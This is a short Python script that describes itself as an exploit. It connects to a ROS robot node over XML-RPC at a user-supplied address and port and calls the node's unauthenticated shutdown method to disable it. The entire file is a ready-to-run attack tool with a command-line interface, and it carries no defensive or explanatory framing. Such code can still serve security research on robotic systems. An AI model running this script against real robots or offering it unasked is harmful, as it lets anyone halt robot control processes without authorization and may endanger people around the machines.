#!/usr/bin/python3
import argparse

import xmlrpc.client


def kill_node(address, port):
    """
        This is a simple exploit script that disables a node though the ros shutdown command
    """

    ID = '/rosnode'
    with xmlrpc.client.ServerProxy("http://" + address + ":" + port) as proxy:
        print("Shutting down node ")
        proxy.shutdown(ID, "")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Shutdown a given ROS node')
    parser.add_argument('-a', '--address', help="Address of the ROS node you want to shutdown", required=True)
    parser.add_argument('-p', '--port', help="Port of the ROS node you want to shutdown", required=True)
    args = parser.parse_args()
    kill_node(args.address, args.port)
